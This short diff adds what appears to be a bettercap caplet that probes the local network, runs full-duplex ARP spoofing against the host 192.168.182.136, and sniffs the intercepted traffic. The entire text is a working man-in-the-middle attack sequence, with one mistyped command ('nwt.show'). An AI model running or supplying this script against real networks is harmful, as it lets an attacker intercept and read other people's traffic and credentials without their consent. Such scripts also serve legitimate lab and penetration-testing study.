@@ -1,0 +1,7 @@
+net.probe on
+nwt.show
+set arp.spoof.fullduplex true
+set arp.spoof.targets 192.168.182.136
+arp.spoof on
+set net.sniff.local true
+net.sniff on
